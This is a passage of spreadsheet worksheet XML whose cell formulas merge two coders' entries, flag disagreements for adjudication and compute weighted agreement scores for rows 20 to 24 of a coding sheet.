        <f>IF(AND(Coder1!AH20&amp;""&lt;&gt;"",Coder1!AH20&amp;""=Coder2!AH20&amp;""),Coder1!AH20,"")</f>
        <v/>
      </c>
      <c r="AI20" s="11">
        <f>IF(COUNT(E20:L20)=0,"",SUM(E20:L20))</f>
        <v/>
      </c>
      <c r="AJ20" s="11">
        <f>IF(AI20="","",N(E20)*3+N(F20)*2+N(G20)*2+N(H20)*2+N(I20)*2+N(J20)*3+N(K20)*3+N(L20)*3)</f>
        <v/>
      </c>
      <c r="AK20" s="11">
        <f>IF(AI20="","",COUNTIF(N20:AG20,1))</f>
        <v/>
      </c>
      <c r="AL20" s="11">
        <f>IF(OR(AJ20="",AJ20=0),"",ROUND(100*(AJ20-AK20)/AJ20,1))</f>
        <v/>
      </c>
      <c r="AM20" s="11">
        <f>IF(AND(Coder1!AN20=1,Coder2!AN20=1),IF(COUNTBLANK(E20:AH20)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN20" s="11">
        <f>IF(AND(Coder1!AN20=1,Coder2!AN20=1),IF(SUMPRODUCT(--(Coder1!E20:AH20&amp;""&lt;&gt;Coder2!E20:AH20&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO20" s="11" t="n"/>
    </row>
    <row r="21">
      <c r="A21" s="11">
        <f>Coder1!A21</f>
        <v/>
      </c>
      <c r="B21" s="11">
        <f>Coder1!B21</f>
        <v/>
      </c>
      <c r="C21" s="11">
        <f>Coder1!C21</f>
        <v/>
      </c>
      <c r="D21" s="11">
        <f>Coder1!D21</f>
        <v/>
      </c>
      <c r="E21" s="14">
        <f>IF(AND(Coder1!E21&amp;""&lt;&gt;"",Coder1!E21&amp;""=Coder2!E21&amp;""),Coder1!E21,"")</f>
        <v/>
      </c>
      <c r="F21" s="14">
        <f>IF(AND(Coder1!F21&amp;""&lt;&gt;"",Coder1!F21&amp;""=Coder2!F21&amp;""),Coder1!F21,"")</f>
        <v/>
      </c>
      <c r="G21" s="14">
        <f>IF(AND(Coder1!G21&amp;""&lt;&gt;"",Coder1!G21&amp;""=Coder2!G21&amp;""),Coder1!G21,"")</f>
        <v/>
      </c>
      <c r="H21" s="14">
        <f>IF(AND(Coder1!H21&amp;""&lt;&gt;"",Coder1!H21&amp;""=Coder2!H21&amp;""),Coder1!H21,"")</f>
        <v/>
      </c>
      <c r="I21" s="14">
        <f>IF(AND(Coder1!I21&amp;""&lt;&gt;"",Coder1!I21&amp;""=Coder2!I21&amp;""),Coder1!I21,"")</f>
        <v/>
      </c>
      <c r="J21" s="14">
        <f>IF(AND(Coder1!J21&amp;""&lt;&gt;"",Coder1!J21&amp;""=Coder2!J21&amp;""),Coder1!J21,"")</f>
        <v/>
      </c>
      <c r="K21" s="14">
        <f>IF(AND(Coder1!K21&amp;""&lt;&gt;"",Coder1!K21&amp;""=Coder2!K21&amp;""),Coder1!K21,"")</f>
        <v/>
      </c>
      <c r="L21" s="14">
        <f>IF(AND(Coder1!L21&amp;""&lt;&gt;"",Coder1!L21&amp;""=Coder2!L21&amp;""),Coder1!L21,"")</f>
        <v/>
      </c>
      <c r="M21" s="14">
        <f>IF(AND(Coder1!M21&amp;""&lt;&gt;"",Coder1!M21&amp;""=Coder2!M21&amp;""),Coder1!M21,"")</f>
        <v/>
      </c>
      <c r="N21" s="14">
        <f>IF(AND(Coder1!N21&amp;""&lt;&gt;"",Coder1!N21&amp;""=Coder2!N21&amp;""),Coder1!N21,"")</f>
        <v/>
      </c>
      <c r="O21" s="14">
        <f>IF(AND(Coder1!O21&amp;""&lt;&gt;"",Coder1!O21&amp;""=Coder2!O21&amp;""),Coder1!O21,"")</f>
        <v/>
      </c>
      <c r="P21" s="14">
        <f>IF(AND(Coder1!P21&amp;""&lt;&gt;"",Coder1!P21&amp;""=Coder2!P21&amp;""),Coder1!P21,"")</f>
        <v/>
      </c>
      <c r="Q21" s="14">
        <f>IF(AND(Coder1!Q21&amp;""&lt;&gt;"",Coder1!Q21&amp;""=Coder2!Q21&amp;""),Coder1!Q21,"")</f>
        <v/>
      </c>
      <c r="R21" s="14">
        <f>IF(AND(Coder1!R21&amp;""&lt;&gt;"",Coder1!R21&amp;""=Coder2!R21&amp;""),Coder1!R21,"")</f>
        <v/>
      </c>
      <c r="S21" s="14">
        <f>IF(AND(Coder1!S21&amp;""&lt;&gt;"",Coder1!S21&amp;""=Coder2!S21&amp;""),Coder1!S21,"")</f>
        <v/>
      </c>
      <c r="T21" s="14">
        <f>IF(AND(Coder1!T21&amp;""&lt;&gt;"",Coder1!T21&amp;""=Coder2!T21&amp;""),Coder1!T21,"")</f>
        <v/>
      </c>
      <c r="U21" s="14">
        <f>IF(AND(Coder1!U21&amp;""&lt;&gt;"",Coder1!U21&amp;""=Coder2!U21&amp;""),Coder1!U21,"")</f>
        <v/>
      </c>
      <c r="V21" s="14">
        <f>IF(AND(Coder1!V21&amp;""&lt;&gt;"",Coder1!V21&amp;""=Coder2!V21&amp;""),Coder1!V21,"")</f>
        <v/>
      </c>
      <c r="W21" s="14">
        <f>IF(AND(Coder1!W21&amp;""&lt;&gt;"",Coder1!W21&amp;""=Coder2!W21&amp;""),Coder1!W21,"")</f>
        <v/>
      </c>
      <c r="X21" s="14">
        <f>IF(AND(Coder1!X21&amp;""&lt;&gt;"",Coder1!X21&amp;""=Coder2!X21&amp;""),Coder1!X21,"")</f>
        <v/>
      </c>
      <c r="Y21" s="14">
        <f>IF(AND(Coder1!Y21&amp;""&lt;&gt;"",Coder1!Y21&amp;""=Coder2!Y21&amp;""),Coder1!Y21,"")</f>
        <v/>
      </c>
      <c r="Z21" s="14">
        <f>IF(AND(Coder1!Z21&amp;""&lt;&gt;"",Coder1!Z21&amp;""=Coder2!Z21&amp;""),Coder1!Z21,"")</f>
        <v/>
      </c>
      <c r="AA21" s="14">
        <f>IF(AND(Coder1!AA21&amp;""&lt;&gt;"",Coder1!AA21&amp;""=Coder2!AA21&amp;""),Coder1!AA21,"")</f>
        <v/>
      </c>
      <c r="AB21" s="14">
        <f>IF(AND(Coder1!AB21&amp;""&lt;&gt;"",Coder1!AB21&amp;""=Coder2!AB21&amp;""),Coder1!AB21,"")</f>
        <v/>
      </c>
      <c r="AC21" s="14">
        <f>IF(AND(Coder1!AC21&amp;""&lt;&gt;"",Coder1!AC21&amp;""=Coder2!AC21&amp;""),Coder1!AC21,"")</f>
        <v/>
      </c>
      <c r="AD21" s="14">
        <f>IF(AND(Coder1!AD21&amp;""&lt;&gt;"",Coder1!AD21&amp;""=Coder2!AD21&amp;""),Coder1!AD21,"")</f>
        <v/>
      </c>
      <c r="AE21" s="14">
        <f>IF(AND(Coder1!AE21&amp;""&lt;&gt;"",Coder1!AE21&amp;""=Coder2!AE21&amp;""),Coder1!AE21,"")</f>
        <v/>
      </c>
      <c r="AF21" s="14">
        <f>IF(AND(Coder1!AF21&amp;""&lt;&gt;"",Coder1!AF21&amp;""=Coder2!AF21&amp;""),Coder1!AF21,"")</f>
        <v/>
      </c>
      <c r="AG21" s="14">
        <f>IF(AND(Coder1!AG21&amp;""&lt;&gt;"",Coder1!AG21&amp;""=Coder2!AG21&amp;""),Coder1!AG21,"")</f>
        <v/>
      </c>
      <c r="AH21" s="14">
        <f>IF(AND(Coder1!AH21&amp;""&lt;&gt;"",Coder1!AH21&amp;""=Coder2!AH21&amp;""),Coder1!AH21,"")</f>
        <v/>
      </c>
      <c r="AI21" s="11">
        <f>IF(COUNT(E21:L21)=0,"",SUM(E21:L21))</f>
        <v/>
      </c>
      <c r="AJ21" s="11">
        <f>IF(AI21="","",N(E21)*3+N(F21)*2+N(G21)*2+N(H21)*2+N(I21)*2+N(J21)*3+N(K21)*3+N(L21)*3)</f>
        <v/>
      </c>
      <c r="AK21" s="11">
        <f>IF(AI21="","",COUNTIF(N21:AG21,1))</f>
        <v/>
      </c>
      <c r="AL21" s="11">
        <f>IF(OR(AJ21="",AJ21=0),"",ROUND(100*(AJ21-AK21)/AJ21,1))</f>
        <v/>
      </c>
      <c r="AM21" s="11">
        <f>IF(AND(Coder1!AN21=1,Coder2!AN21=1),IF(COUNTBLANK(E21:AH21)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN21" s="11">
        <f>IF(AND(Coder1!AN21=1,Coder2!AN21=1),IF(SUMPRODUCT(--(Coder1!E21:AH21&amp;""&lt;&gt;Coder2!E21:AH21&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO21" s="11" t="n"/>
    </row>
    <row r="22">
      <c r="A22" s="11">
        <f>Coder1!A22</f>
        <v/>
      </c>
      <c r="B22" s="11">
        <f>Coder1!B22</f>
        <v/>
      </c>
      <c r="C22" s="11">
        <f>Coder1!C22</f>
        <v/>
      </c>
      <c r="D22" s="11">
        <f>Coder1!D22</f>
        <v/>
      </c>
      <c r="E22" s="14">
        <f>IF(AND(Coder1!E22&amp;""&lt;&gt;"",Coder1!E22&amp;""=Coder2!E22&amp;""),Coder1!E22,"")</f>
        <v/>
      </c>
      <c r="F22" s="14">
        <f>IF(AND(Coder1!F22&amp;""&lt;&gt;"",Coder1!F22&amp;""=Coder2!F22&amp;""),Coder1!F22,"")</f>
        <v/>
      </c>
      <c r="G22" s="14">
        <f>IF(AND(Coder1!G22&amp;""&lt;&gt;"",Coder1!G22&amp;""=Coder2!G22&amp;""),Coder1!G22,"")</f>
        <v/>
      </c>
      <c r="H22" s="14">
        <f>IF(AND(Coder1!H22&amp;""&lt;&gt;"",Coder1!H22&amp;""=Coder2!H22&amp;""),Coder1!H22,"")</f>
        <v/>
      </c>
      <c r="I22" s="14">
        <f>IF(AND(Coder1!I22&amp;""&lt;&gt;"",Coder1!I22&amp;""=Coder2!I22&amp;""),Coder1!I22,"")</f>
        <v/>
      </c>
      <c r="J22" s="14">
        <f>IF(AND(Coder1!J22&amp;""&lt;&gt;"",Coder1!J22&amp;""=Coder2!J22&amp;""),Coder1!J22,"")</f>
        <v/>
      </c>
      <c r="K22" s="14">
        <f>IF(AND(Coder1!K22&amp;""&lt;&gt;"",Coder1!K22&amp;""=Coder2!K22&amp;""),Coder1!K22,"")</f>
        <v/>
      </c>
      <c r="L22" s="14">
        <f>IF(AND(Coder1!L22&amp;""&lt;&gt;"",Coder1!L22&amp;""=Coder2!L22&amp;""),Coder1!L22,"")</f>
        <v/>
      </c>
      <c r="M22" s="14">
        <f>IF(AND(Coder1!M22&amp;""&lt;&gt;"",Coder1!M22&amp;""=Coder2!M22&amp;""),Coder1!M22,"")</f>
        <v/>
      </c>
      <c r="N22" s="14">
        <f>IF(AND(Coder1!N22&amp;""&lt;&gt;"",Coder1!N22&amp;""=Coder2!N22&amp;""),Coder1!N22,"")</f>
        <v/>
      </c>
      <c r="O22" s="14">
        <f>IF(AND(Coder1!O22&amp;""&lt;&gt;"",Coder1!O22&amp;""=Coder2!O22&amp;""),Coder1!O22,"")</f>
        <v/>
      </c>
      <c r="P22" s="14">
        <f>IF(AND(Coder1!P22&amp;""&lt;&gt;"",Coder1!P22&amp;""=Coder2!P22&amp;""),Coder1!P22,"")</f>
        <v/>
      </c>
      <c r="Q22" s="14">
        <f>IF(AND(Coder1!Q22&amp;""&lt;&gt;"",Coder1!Q22&amp;""=Coder2!Q22&amp;""),Coder1!Q22,"")</f>
        <v/>
      </c>
      <c r="R22" s="14">
        <f>IF(AND(Coder1!R22&amp;""&lt;&gt;"",Coder1!R22&amp;""=Coder2!R22&amp;""),Coder1!R22,"")</f>
        <v/>
      </c>
      <c r="S22" s="14">
        <f>IF(AND(Coder1!S22&amp;""&lt;&gt;"",Coder1!S22&amp;""=Coder2!S22&amp;""),Coder1!S22,"")</f>
        <v/>
      </c>
      <c r="T22" s="14">
        <f>IF(AND(Coder1!T22&amp;""&lt;&gt;"",Coder1!T22&amp;""=Coder2!T22&amp;""),Coder1!T22,"")</f>
        <v/>
      </c>
      <c r="U22" s="14">
        <f>IF(AND(Coder1!U22&amp;""&lt;&gt;"",Coder1!U22&amp;""=Coder2!U22&amp;""),Coder1!U22,"")</f>
        <v/>
      </c>
      <c r="V22" s="14">
        <f>IF(AND(Coder1!V22&amp;""&lt;&gt;"",Coder1!V22&amp;""=Coder2!V22&amp;""),Coder1!V22,"")</f>
        <v/>
      </c>
      <c r="W22" s="14">
        <f>IF(AND(Coder1!W22&amp;""&lt;&gt;"",Coder1!W22&amp;""=Coder2!W22&amp;""),Coder1!W22,"")</f>
        <v/>
      </c>
      <c r="X22" s="14">
        <f>IF(AND(Coder1!X22&amp;""&lt;&gt;"",Coder1!X22&amp;""=Coder2!X22&amp;""),Coder1!X22,"")</f>
        <v/>
      </c>
      <c r="Y22" s="14">
        <f>IF(AND(Coder1!Y22&amp;""&lt;&gt;"",Coder1!Y22&amp;""=Coder2!Y22&amp;""),Coder1!Y22,"")</f>
        <v/>
      </c>
      <c r="Z22" s="14">
        <f>IF(AND(Coder1!Z22&amp;""&lt;&gt;"",Coder1!Z22&amp;""=Coder2!Z22&amp;""),Coder1!Z22,"")</f>
        <v/>
      </c>
      <c r="AA22" s="14">
        <f>IF(AND(Coder1!AA22&amp;""&lt;&gt;"",Coder1!AA22&amp;""=Coder2!AA22&amp;""),Coder1!AA22,"")</f>
        <v/>
      </c>
      <c r="AB22" s="14">
        <f>IF(AND(Coder1!AB22&amp;""&lt;&gt;"",Coder1!AB22&amp;""=Coder2!AB22&amp;""),Coder1!AB22,"")</f>
        <v/>
      </c>
      <c r="AC22" s="14">
        <f>IF(AND(Coder1!AC22&amp;""&lt;&gt;"",Coder1!AC22&amp;""=Coder2!AC22&amp;""),Coder1!AC22,"")</f>
        <v/>
      </c>
      <c r="AD22" s="14">
        <f>IF(AND(Coder1!AD22&amp;""&lt;&gt;"",Coder1!AD22&amp;""=Coder2!AD22&amp;""),Coder1!AD22,"")</f>
        <v/>
      </c>
      <c r="AE22" s="14">
        <f>IF(AND(Coder1!AE22&amp;""&lt;&gt;"",Coder1!AE22&amp;""=Coder2!AE22&amp;""),Coder1!AE22,"")</f>
        <v/>
      </c>
      <c r="AF22" s="14">
        <f>IF(AND(Coder1!AF22&amp;""&lt;&gt;"",Coder1!AF22&amp;""=Coder2!AF22&amp;""),Coder1!AF22,"")</f>
        <v/>
      </c>
      <c r="AG22" s="14">
        <f>IF(AND(Coder1!AG22&amp;""&lt;&gt;"",Coder1!AG22&amp;""=Coder2!AG22&amp;""),Coder1!AG22,"")</f>
        <v/>
      </c>
      <c r="AH22" s="14">
        <f>IF(AND(Coder1!AH22&amp;""&lt;&gt;"",Coder1!AH22&amp;""=Coder2!AH22&amp;""),Coder1!AH22,"")</f>
        <v/>
      </c>
      <c r="AI22" s="11">
        <f>IF(COUNT(E22:L22)=0,"",SUM(E22:L22))</f>
        <v/>
      </c>
      <c r="AJ22" s="11">
        <f>IF(AI22="","",N(E22)*3+N(F22)*2+N(G22)*2+N(H22)*2+N(I22)*2+N(J22)*3+N(K22)*3+N(L22)*3)</f>
        <v/>
      </c>
      <c r="AK22" s="11">
        <f>IF(AI22="","",COUNTIF(N22:AG22,1))</f>
        <v/>
      </c>
      <c r="AL22" s="11">
        <f>IF(OR(AJ22="",AJ22=0),"",ROUND(100*(AJ22-AK22)/AJ22,1))</f>
        <v/>
      </c>
      <c r="AM22" s="11">
        <f>IF(AND(Coder1!AN22=1,Coder2!AN22=1),IF(COUNTBLANK(E22:AH22)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN22" s="11">
        <f>IF(AND(Coder1!AN22=1,Coder2!AN22=1),IF(SUMPRODUCT(--(Coder1!E22:AH22&amp;""&lt;&gt;Coder2!E22:AH22&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO22" s="11" t="n"/>
    </row>
    <row r="23">
      <c r="A23" s="11">
        <f>Coder1!A23</f>
        <v/>
      </c>
      <c r="B23" s="11">
        <f>Coder1!B23</f>
        <v/>
      </c>
      <c r="C23" s="11">
        <f>Coder1!C23</f>
        <v/>
      </c>
      <c r="D23" s="11">
        <f>Coder1!D23</f>
        <v/>
      </c>
      <c r="E23" s="14">
        <f>IF(AND(Coder1!E23&amp;""&lt;&gt;"",Coder1!E23&amp;""=Coder2!E23&amp;""),Coder1!E23,"")</f>
        <v/>
      </c>
      <c r="F23" s="14">
        <f>IF(AND(Coder1!F23&amp;""&lt;&gt;"",Coder1!F23&amp;""=Coder2!F23&amp;""),Coder1!F23,"")</f>
        <v/>
      </c>
      <c r="G23" s="14">
        <f>IF(AND(Coder1!G23&amp;""&lt;&gt;"",Coder1!G23&amp;""=Coder2!G23&amp;""),Coder1!G23,"")</f>
        <v/>
      </c>
      <c r="H23" s="14">
        <f>IF(AND(Coder1!H23&amp;""&lt;&gt;"",Coder1!H23&amp;""=Coder2!H23&amp;""),Coder1!H23,"")</f>
        <v/>
      </c>
      <c r="I23" s="14">
        <f>IF(AND(Coder1!I23&amp;""&lt;&gt;"",Coder1!I23&amp;""=Coder2!I23&amp;""),Coder1!I23,"")</f>
        <v/>
      </c>
      <c r="J23" s="14">
        <f>IF(AND(Coder1!J23&amp;""&lt;&gt;"",Coder1!J23&amp;""=Coder2!J23&amp;""),Coder1!J23,"")</f>
        <v/>
      </c>
      <c r="K23" s="14">
        <f>IF(AND(Coder1!K23&amp;""&lt;&gt;"",Coder1!K23&amp;""=Coder2!K23&amp;""),Coder1!K23,"")</f>
        <v/>
      </c>
      <c r="L23" s="14">
        <f>IF(AND(Coder1!L23&amp;""&lt;&gt;"",Coder1!L23&amp;""=Coder2!L23&amp;""),Coder1!L23,"")</f>
        <v/>
      </c>
      <c r="M23" s="14">
        <f>IF(AND(Coder1!M23&amp;""&lt;&gt;"",Coder1!M23&amp;""=Coder2!M23&amp;""),Coder1!M23,"")</f>
        <v/>
      </c>
      <c r="N23" s="14">
        <f>IF(AND(Coder1!N23&amp;""&lt;&gt;"",Coder1!N23&amp;""=Coder2!N23&amp;""),Coder1!N23,"")</f>
        <v/>
      </c>
      <c r="O23" s="14">
        <f>IF(AND(Coder1!O23&amp;""&lt;&gt;"",Coder1!O23&amp;""=Coder2!O23&amp;""),Coder1!O23,"")</f>
        <v/>
      </c>
      <c r="P23" s="14">
        <f>IF(AND(Coder1!P23&amp;""&lt;&gt;"",Coder1!P23&amp;""=Coder2!P23&amp;""),Coder1!P23,"")</f>
        <v/>
      </c>
      <c r="Q23" s="14">
        <f>IF(AND(Coder1!Q23&amp;""&lt;&gt;"",Coder1!Q23&amp;""=Coder2!Q23&amp;""),Coder1!Q23,"")</f>
        <v/>
      </c>
      <c r="R23" s="14">
        <f>IF(AND(Coder1!R23&amp;""&lt;&gt;"",Coder1!R23&amp;""=Coder2!R23&amp;""),Coder1!R23,"")</f>
        <v/>
      </c>
      <c r="S23" s="14">
        <f>IF(AND(Coder1!S23&amp;""&lt;&gt;"",Coder1!S23&amp;""=Coder2!S23&amp;""),Coder1!S23,"")</f>
        <v/>
      </c>
      <c r="T23" s="14">
        <f>IF(AND(Coder1!T23&amp;""&lt;&gt;"",Coder1!T23&amp;""=Coder2!T23&amp;""),Coder1!T23,"")</f>
        <v/>
      </c>
      <c r="U23" s="14">
        <f>IF(AND(Coder1!U23&amp;""&lt;&gt;"",Coder1!U23&amp;""=Coder2!U23&amp;""),Coder1!U23,"")</f>
        <v/>
      </c>
      <c r="V23" s="14">
        <f>IF(AND(Coder1!V23&amp;""&lt;&gt;"",Coder1!V23&amp;""=Coder2!V23&amp;""),Coder1!V23,"")</f>
        <v/>
      </c>
      <c r="W23" s="14">
        <f>IF(AND(Coder1!W23&amp;""&lt;&gt;"",Coder1!W23&amp;""=Coder2!W23&amp;""),Coder1!W23,"")</f>
        <v/>
      </c>
      <c r="X23" s="14">
        <f>IF(AND(Coder1!X23&amp;""&lt;&gt;"",Coder1!X23&amp;""=Coder2!X23&amp;""),Coder1!X23,"")</f>
        <v/>
      </c>
      <c r="Y23" s="14">
        <f>IF(AND(Coder1!Y23&amp;""&lt;&gt;"",Coder1!Y23&amp;""=Coder2!Y23&amp;""),Coder1!Y23,"")</f>
        <v/>
      </c>
      <c r="Z23" s="14">
        <f>IF(AND(Coder1!Z23&amp;""&lt;&gt;"",Coder1!Z23&amp;""=Coder2!Z23&amp;""),Coder1!Z23,"")</f>
        <v/>
      </c>
      <c r="AA23" s="14">
        <f>IF(AND(Coder1!AA23&amp;""&lt;&gt;"",Coder1!AA23&amp;""=Coder2!AA23&amp;""),Coder1!AA23,"")</f>
        <v/>
      </c>
      <c r="AB23" s="14">
        <f>IF(AND(Coder1!AB23&amp;""&lt;&gt;"",Coder1!AB23&amp;""=Coder2!AB23&amp;""),Coder1!AB23,"")</f>
        <v/>
      </c>
      <c r="AC23" s="14">
        <f>IF(AND(Coder1!AC23&amp;""&lt;&gt;"",Coder1!AC23&amp;""=Coder2!AC23&amp;""),Coder1!AC23,"")</f>
        <v/>
      </c>
      <c r="AD23" s="14">
        <f>IF(AND(Coder1!AD23&amp;""&lt;&gt;"",Coder1!AD23&amp;""=Coder2!AD23&amp;""),Coder1!AD23,"")</f>
        <v/>
      </c>
      <c r="AE23" s="14">
        <f>IF(AND(Coder1!AE23&amp;""&lt;&gt;"",Coder1!AE23&amp;""=Coder2!AE23&amp;""),Coder1!AE23,"")</f>
        <v/>
      </c>
      <c r="AF23" s="14">
        <f>IF(AND(Coder1!AF23&amp;""&lt;&gt;"",Coder1!AF23&amp;""=Coder2!AF23&amp;""),Coder1!AF23,"")</f>
        <v/>
      </c>
      <c r="AG23" s="14">
        <f>IF(AND(Coder1!AG23&amp;""&lt;&gt;"",Coder1!AG23&amp;""=Coder2!AG23&amp;""),Coder1!AG23,"")</f>
        <v/>
      </c>
      <c r="AH23" s="14">
        <f>IF(AND(Coder1!AH23&amp;""&lt;&gt;"",Coder1!AH23&amp;""=Coder2!AH23&amp;""),Coder1!AH23,"")</f>
        <v/>
      </c>
      <c r="AI23" s="11">
        <f>IF(COUNT(E23:L23)=0,"",SUM(E23:L23))</f>
        <v/>
      </c>
      <c r="AJ23" s="11">
        <f>IF(AI23="","",N(E23)*3+N(F23)*2+N(G23)*2+N(H23)*2+N(I23)*2+N(J23)*3+N(K23)*3+N(L23)*3)</f>
        <v/>
      </c>
      <c r="AK23" s="11">
        <f>IF(AI23="","",COUNTIF(N23:AG23,1))</f>
        <v/>
      </c>
      <c r="AL23" s="11">
        <f>IF(OR(AJ23="",AJ23=0),"",ROUND(100*(AJ23-AK23)/AJ23,1))</f>
        <v/>
      </c>
      <c r="AM23" s="11">
        <f>IF(AND(Coder1!AN23=1,Coder2!AN23=1),IF(COUNTBLANK(E23:AH23)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN23" s="11">
        <f>IF(AND(Coder1!AN23=1,Coder2!AN23=1),IF(SUMPRODUCT(--(Coder1!E23:AH23&amp;""&lt;&gt;Coder2!E23:AH23&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO23" s="11" t="n"/>
    </row>
    <row r="24">
      <c r="A24" s="11">
        <f>Coder1!A24</f>
        <v/>
      </c>
      <c r="B24" s="11">
        <f>Coder1!B24</f>
        <v/>
      </c>
      <c r="C24" s="11">
        <f>Coder1!C24</f>
        <v/>
      </c>
      <c r="D24" s="11">
        <f>Coder1!D24</f>
        <v/>
      </c>
      <c r="E24" s="14">
        <f>IF(AND(Coder1!E24&amp;""&lt;&gt;"",Coder1!E24&amp;""=Coder2!E24&amp;""),Coder1!E24,"")</f>
        <v/>
      </c>
      <c r="F24" s="14">
        <f>IF(AND(Coder1!F24&amp;""&lt;&gt;"",Coder1!F24&amp;""=Coder2!F24&amp;""),Coder1!F24,"")</f>
        <v/>
      </c>
      <c r="G24" s="14">
        <f>IF(AND(Coder1!G24&amp;""&lt;&gt;"",Coder1!G24&amp;""=Coder2!G24&amp;""),Coder1!G24,"")</f>
        <v/>
      </c>
      <c r="H24" s="14">
        <f>IF(AND(Coder1!H24&amp;""&lt;&gt;"",Coder1!H24&amp;""=Coder2!H24&amp;""),Coder1!H24,"")</f>
        <v/>
      </c>
      <c r="I24" s="14">
        <f>IF(AND(Coder1!I24&amp;""&lt;&gt;"",Coder1!I24&amp;""=Coder2!I24&amp;""),Coder1!I24,"")</f>
        <v/>
      </c>
      <c r="J24" s="14">
        <f>IF(AND(Coder1!J24&amp;""&lt;&gt;"",Coder1!J24&amp;""=Coder2!J24&amp;""),Coder1!J24,"")</f>
        <v/>
      </c>
      <c r="K24" s="14">
        <f>IF(AND(Coder1!K24&amp;""&lt;&gt;"",Coder1!K24&amp;""=Coder2!K24&amp;""),Coder1!K24,"")</f>
        <v/>
      </c>
      <c r="L24" s="14">
        <f>IF(AND(Coder1!L24&amp;""&lt;&gt;"",Coder1!L24&amp;""=Coder2!L24&amp;""),Coder1!L24,"")</f>
        <v/>
      </c>
      <c r="M24" s="14">
        <f>IF(AND(Coder1!M24&amp;""&lt;&gt;"",Coder1!M24&amp;""=Coder2!M24&amp;""),Coder1!M24,"")</f>
        <v/>
      </c>
      <c r="N24" s="14">
        <f>IF(AND(Coder1!N24&amp;""&lt;&gt;"",Coder1!N24&amp;""=Coder2!N24&amp;""),Coder1!N24,"")</f>
        <v/>
      </c>
      <c r="O24" s="14">
        <f>IF(AND(Coder1!O24&amp;""&lt;&gt;"",Coder1!O24&amp;""=Coder2!O24&amp;""),Coder1!O24,"")</f>
        <v/>
      </c>
      <c r="P24" s="14">
        <f>IF(AND(Coder1!P24&amp;""&lt;&gt;"",Coder1!P24&amp;""=Coder2!P24&amp;""),Coder1!P24,"")</f>
        <v/>
      </c>
      <c r="Q24" s="14">
        <f>IF(AND(Coder1!Q24&amp;""&lt;&gt;"",Coder1!Q24&amp;""=Coder2!Q24&amp;""),Coder1!Q24,"")</f>
        <v/>
      </c>
      <c r="R24" s="14">
        <f>IF(AND(Coder1!R24&amp;""&lt;&gt;"",Coder1!R24&amp;""=Coder2!R24&amp;""),Coder1!R24,"")</f>
        <v/>
      </c>
      <c r="S24" s="14">
        <f>IF(AND(Coder1!S24&amp;""&lt;&gt;"",Coder1!S24&amp;""=Coder2!S24&amp;""),Coder1!S24,"")</f>
        <v/>
      </c>
      <c r="T24" s="14">
        <f>IF(AND(Coder1!T24&amp;""&lt;&gt;"",Coder1!T24&amp;""=Coder2!T24&amp;""),Coder1!T24,"")</f>
        <v/>
      </c>
      <c r="U24" s="14">
        <f>IF(AND(Coder1!U24&amp;""&lt;&gt;"",Coder1!U24&amp;""=Coder2!U24&amp;""),Coder1!U24,"")</f>
        <v/>
      </c>
      <c r="V24" s="14">
        <f>IF(AND(Coder1!V24&amp;""&lt;&gt;"",Coder1!V24&amp;""=Coder2!V24&amp;""),Coder1!V24,"")</f>
        <v/>
      </c>
      <c r="W24" s="14">
        <f>IF(AND(Coder1!W24&amp;""&lt;&gt;"",Coder1!W24&amp;""=Coder2!W24&amp;""),Coder1!W24,"")</f>
        <v/>
      </c>
      <c r="X24" s="14">
        <f>IF(AND(Coder1!X24&amp;""&lt;&gt;"",Coder1!X24&amp;""=Coder2!X24&amp;""),Coder1!X24,"")</f>
        <v/>
      </c>
      <c r="Y24" s="14">
        <f>IF(AND(Coder1!Y24&amp;""&lt;&gt;"",Coder1!Y24&amp;""=Coder2!Y24&amp;""),Coder1!Y24,"")</f>
        <v/>
      </c>
      <c r="Z24" s="14">
        <f>IF(AND(Coder1!Z24&amp;""&lt;&gt;"",Coder1!Z24&amp;""=Coder2!Z24&amp;""),Coder1!Z24,"")</f>
        <v/>
      </c>
      <c r="AA24" s="14">
        <f>IF(AND(Coder1!AA24&amp;""&lt;&gt;"",Coder1!AA24&amp;""=Coder2!AA24&amp;""),Coder1!AA24,"")</f>
        <v/>
      </c>
      <c r="AB24" s="14">
        <f>IF(AND(Coder1!AB24&amp;""&lt;&gt;"",Coder1!AB24&amp;""=Coder2!AB24&amp;""),Coder1!AB24,"")</f>
        <v/>
      </c>
      <c r="AC24" s="14">
        <f>IF(AND(Coder1!AC24&amp;""&lt;&gt;"",Coder1!AC24&amp;""=Coder2!AC24&amp;""),Coder1!AC24,"")</f>
        <v/>
      </c>
      <c r="AD24" s="14">
        <f>IF(AND(Coder1!AD24&amp;""&lt;&gt;"",Coder1!AD24&amp;""=Coder2!AD24&amp;""),Coder1!AD24,"")</f>
        <v/>
      </c>
      <c r="AE24" s="14">
        <f>IF(AND(Coder1!AE24&amp;""&lt;&gt;"",Coder1!AE24&amp;""=Coder2!AE24&amp;""),Coder1!AE24,"")</f>
        <v/>
      </c>
      <c r="AF24" s="14">
        <f>IF(AND(Coder1!AF24&amp;""&lt;&gt;"",Coder1!AF24&amp;""=Coder2!AF24&amp;""),Coder1!AF24,"")</f>
        <v/>
      </c>
      <c r="AG24" s="14">
        <f>IF(AND(Coder1!AG24&amp;""&lt;&gt;"",Coder1!AG24&amp;""=Coder2!AG24&amp;""),Coder1!AG24,"")</f>
        <v/>
      </c>
      <c r="AH24" s="14">
        <f>IF(AND(Coder1!AH24&amp;""&lt;&gt;"",Coder1!AH24&amp;""=Coder2!AH24&amp;""),Coder1!AH24,"")</f>
        <v/>
      </c>
      <c r="AI24" s="11">
        <f>IF(COUNT(E24:L24)=0,"",SUM(E24:L24))</f>
        <v/>
      </c>
      <c r="AJ24" s="11">
        <f>IF(AI24="","",N(E24)*3+N(F24)*2+N(G24)*2+N(H24)*2+N(I24)*2+N(J24)*3+N(K24)*3+N(L24)*3)</f>
        <v/>
      </c>
      <c r="AK24" s="11">
        <f>IF(AI24="","",COUNTIF(N24:AG24,1))</f>
        <v/>
      </c>
      <c r="AL24" s="11">
